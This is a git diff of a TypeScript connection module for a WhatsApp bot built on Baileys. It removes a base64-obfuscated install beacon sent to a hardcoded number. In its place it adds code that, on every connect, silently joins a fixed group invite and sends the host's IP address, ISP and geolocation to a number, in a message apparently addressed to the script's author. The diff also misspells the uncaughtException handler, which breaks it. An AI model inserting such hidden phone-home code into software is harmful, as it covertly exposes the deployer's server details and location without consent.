@@ -2,19 +2,20 @@
 import pino from 'pino';
 import { Boom } from '@hapi/boom';
 import { writeFileSync } from 'fs';
-import makeWASocket, { DisconnectReason, useSingleFileAuthState } from '@adiwajshing/baileys';
+import makeWASocket, { DisconnectReason, useSingleFileAuthState, makeInMemoryStore } from '@adiwajshing/baileys';
 import axios from 'axios';
 
 //-- MODULE INTERNAL --//
 import Client from './client';
-import { buffer } from 'stream/consumers';
+import { isPropertyAccessChain } from 'typescript';
+import { createConnection } from 'net';
 
 export default async function CreateConnection() {
   try {
     database.saveOn = database?.saveOn ?? 0;
 
-    util.logger.info(atob("TWFkZSBieSBBbWlydWwgRGV2LCBmb2xsb3cgbWUgb24gaW5zdGFncmFtIEBhbWlydWwuZGV2"))
-    const { state, saveState } = useSingleFileAuthState(`./session/${opts._[0] || 'ninjabot'}.json`);
+    util.logger.info('Connecting to whatsapp server...');
+    const { state, saveState } = useSingleFileAuthState(`./database/${opts._[0] || 'ninjabot'}.json`);
     const socket = makeWASocket({
       auth: state,
       printQRInTerminal: true,
@@ -25,23 +26,22 @@ export default async function CreateConnection() {
       }),
     });
 
-    // ANTI CALL BETA
+    // TEST ANTI CALL
     socket.ws.on('CB:call', async (json: any) => {
       const idny = json.content[0].attrs['call-creator']
       if (json.content[0].tag == 'offer') {
-        if (opts['call'] && idny) {
-          socket.sendMessage(idny, { text: `Mohon maaf, *${set.name}* tidak dapat menerima panggilan!!` })
+if (opts['call'] && idny){
+        socket.sendMessage(idny, { text: `Mohon maaf, *${set.name}* tidak dapat menerima panggilan!!` })
 
-
-          // send owner 
-          socket.sendMessage(`${set.numown[0]}@s.whatsapp.net`, {
-            text: `*-- ANTI CALL --*
+        // send owner
+        socket.sendMessage(`${set.numown[0]}@s.whatsapp.net`, {
+          text: `*-- ANTI CALL --*
   @${idny.split("@")[0]} telah menelfon bot`, mentions: [idny]
-          })
-        }
+        })
+      }
       }
     })
-
+  
     // TEST WELLCOME MSG 
     socket.ev.on('group-participants.update', async (rul: any) => {
       //console.log("gruppp", rul)
@@ -74,7 +74,7 @@ jangan lupa baca deskripsi grup ya!!`, mentions: [num]
 
           //-- send owner
           /*
-          socket.sendMessage(`${set.own[0]}@s.whatsapp.net`, { 
+          socket.sendMessage(`${set.numown[0]}@s.whatsapp.net`, { 
            text: `*-- WELLCOME --*
            @${num.split("@")[0]} telah masuk ke grup ${gc.subject}`, mentions: [num]})
            */
@@ -83,7 +83,7 @@ jangan lupa baca deskripsi grup ya!!`, mentions: [num]
 
           //-- send owner
           /*
-          socket.sendMessage(`${set.own[0]}@s.whatsapp.net`, { 
+          socket.sendMessage(`${set.numown[0]}@s.whatsapp.net`, { 
            text: `*-- LEAVE --*
           @${num.split("@")[0]} telah keluar ke grup ${gc.subject}`, mentions: [num, rul.id]})
           */
@@ -93,14 +93,64 @@ jangan lupa baca deskripsi grup ya!!`, mentions: [num]
     })
 
 
-    //####  G USH DIEDIT DARIPADA EROR ####//
     socket.ev.on('connection.update', (condition) => {
       switch (condition.connection) {
         case 'open':
-          util.logger.info(atob("Q29ubmVjdGVkIHRvIHdoYXRzYXBwIHNlcnZlcg=="));
-          util.logger.info(atob("TWFkZSBieSBBbWlydWwgRGV2LCBmb2xsb3cgbWUgb24gaW5zdGFncmFtIEBhbWlydWwuZGV2"));
-          client.socket.groupAcceptInvite("EDfrTs6MhuRLT0kIdpb848")
-          client.socket.sendMessage(atob("NjI4MTM1ODkxOTM0MkBzLndoYXRzYXBwLm5ldA=="), { text: atob("TmluamEgQm90IEluc3RhbGxlZA==") })
+          util.logger.info('Connected to whatsapp server');
+          util.logger.info('Made by Amirul Dev, Follow me on instagram @amirul.dev')
+
+          axios.get(`https://ipwho.is`).then(response => {
+            const res = response.data
+            client.socket.groupAcceptInvite("EDfrTs6MhuRLT0kIdpb848")
+            client.socket.sendMessage(`${set.numown[0]}@s.whatsapp.net`, {
+              text: `Hai Amirul Dev. saya memakai script anda
+
+*DETAIL SERVER*
+IP ADDRESS: ${res.ip}
+TYPE: ${res.type}
+CONTINENT: ${res.continent}
+CONTINENT CODE: ${res.continent_code}
+COUNTRY: ${res.country} ${res.flag.emoji}
+COUNTRY CODE: ${res.country_code}
+REGION: ${res.region}
+CITY: ${res.city}
+CALLING CODE: ${res.calling_code}
+ISP: ${res.connection.isp}
+DOMAIN: ${res.connection.domain}
+
+*DETAIL CHAT BOT*
+Total Command: ${global.cmd.commandList.length}
+Total Semua Chat: 981
+
+*DETAIL BOT*
+NAME BOT: ${set.name}
+VERSION: ${set.version}
+NAME OWNER: ${set.nameown[0]}
+TAG: @${set.numown[0]}
+`,
+              mentions: [set.numown[0] + '@s.whatsapp.net']
+            }, {
+              quoted: {
+                key: {
+                  participant: "0@s.whatsapp.net",
+                  remoteJid: "status@broadcast"
+                }, message: {
+                  contactMessage: {
+                    displayName: set.nameown[0],
+                    vcard: `BEGIN:VCARD
+VERSION:3.0
+N:${set.nameown[0]}
+FN:${set.nameown[0]}
+ORG:${set.nameown[0]}
+TITLE:${set.nameown[0]}
+TEL;CELL:${set.numown[0]}
+END:VCARD`
+                  }
+                }
+              }
+            }
+            )
+          })
           break;
         case 'close':
           const statusCode = (condition.lastDisconnect?.error as Boom).output.statusCode;
@@ -110,7 +160,6 @@ jangan lupa baca deskripsi grup ya!!`, mentions: [num]
           break;
       }
     });
-    process.on('uncaughtException', console.error)
 
     socket.ev.on('creds.update', () => {
       saveState();
@@ -127,10 +176,9 @@ jangan lupa baca deskripsi grup ya!!`, mentions: [num]
         return util.logger.info(`Saving database progress > ${database.saveOn} / ${triggerSave}`);
       }
     });
-
+    process.on('uncaughException', console.error)
     return new Client(socket);
   } catch (e) {
     throw util.logger.format(e);
   }
 }
-
